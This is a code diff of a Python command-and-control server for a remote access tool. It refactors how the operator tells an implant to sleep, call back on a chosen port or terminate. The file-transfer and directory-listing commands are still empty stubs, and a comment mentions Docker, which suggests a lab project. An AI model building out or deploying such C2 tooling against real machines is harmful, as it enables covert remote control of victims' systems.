@@ -10,33 +10,9 @@ import socket
 import ctypes
 
 import Common
+import Disconnect
 import File
 import Dir
-
-
-def handleDisconnect(sock) -> bool:
-    # Ask user if they want to kill connection or set timeout (if kill connection set timeout to 0)
-    callback = int(input("Number of seconds for implant to sleep before callback (0 to kill implant) > "))
-
-    # If the user wants the implant to callback, specify which port they want us to listen in on for next time
-    if (callback != 0):
-        callback_port = int(input("Port number you would like the implant to call back in on > "))
-    else:
-        callback_port = 0
-
-
-    # DisconnectCommand -> CommandDetails -> Command
-    disconnect_sleep = Common.DisconnectCommand(sleep=callback, callbackport=callback_port)
-    disconnect_details = Common.CommandDetails(disconnectcommand=disconnect_sleep)
-    disconnect_command = Common.Command(command=Common.Commands.disconnect, commanddetails=disconnect_details)
-
-    bytes_sent = sock.send(bytes(disconnect_command))
-
-    print(f"Sent {bytes_sent} bytes to implant")
-
-    sock.close()
-
-    return True
 
 
 # Handle initial connection to our implant
@@ -69,7 +45,7 @@ def printHelp() -> str:
 # Main starting point for our RAT; implant will call back to our C2 when executed (with its configured port)
     # TODO: change this so we either call-out or wait for a call-in from our implant
 def main():
-    host_ip = '0.0.0.0'
+    host_ip = '0.0.0.0' # Listen on all interfaces so our other Docker container can connect 
     host_port = 0
     exit = False
 
@@ -84,18 +60,35 @@ def main():
         choice = int(input('> '))
         match choice:
             case Common.Commands.disconnect:
-                if (not handleDisconnect(sock)):
+                # Ask user if they want to kill connection or set timeout (if kill connection set timeout to 0)
+                    # Do math to convert to milliseconds 
+                callback = int(input("Number of seconds for implant to sleep before callback (0 to kill implant) > ")) * 1000
+
+                # If the user wants the implant to callback, specify which port they want us to listen in on for next time
+                if (callback != 0):
+                    callback_port = int(input("Port number you would like the implant to call back in on > "))
+                else:
+                    callback_port = 0
+                if (not Disconnect.handleDisconnect(sock, callback, callback_port)):
                     print("Failed disconnect!")
-                exit = True
+                
+                # The user is done so exit, otherwise dont
+                if (not callback_port):
+                    exit = True
+
             case Common.Commands.getfile:
                 return
+            
             case Common.Commands.putfile:
                 return
+            
             case Common.Commands.dirlist:
                 return
+            
+            case _:
+                print("Invalid choice!")
+
         
-
-
 
 if __name__ == '__main__':
     main()
